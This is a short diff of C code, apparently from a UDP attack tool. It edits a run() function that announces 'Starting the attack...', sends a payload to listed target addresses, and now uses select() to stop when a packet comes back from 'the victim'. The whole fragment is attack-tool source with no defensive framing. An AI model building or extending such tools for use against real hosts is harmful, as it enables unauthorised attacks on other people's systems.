@@ -155,7 +155,12 @@ void prog_udp(char *ip, int port, char *payload)
 
 void run(int sockfd, struct msg message, char *payload)
 {
-	
+	fd_set master;
+	fd_set read_fds;
+	int fdmax;
+	FD_SET(sockfd, &master);
+	fdmax = sockfd;
+
 	printf("Starting the attack...\n");
 	printf("Payload: %s\n", payload);
 	
@@ -178,6 +183,17 @@ void run(int sockfd, struct msg message, char *payload)
 				w_getaddrinfo(message.entry[i].ip_address, message.entry[i].port_number, &hints, &res);
 				
 				w_sendto(sockfd, str, strlen(str), 0, res->ai_addr, res->ai_addrlen);
+				
+				//TODO
+				//Add select() to check if victim has sent something
+				read_fds = master;
+				w_select(fdmax+1, &read_fds, NULL, NULL, NULL);
+				if(FD_ISSET(sockfd, &read_fds)){
+					printf("Received a packet from the victim.\n");
+					freeaddrinfo(res);
+					close(sockfd);
+					return;
+				}
 				
 				freeaddrinfo(res);
 				
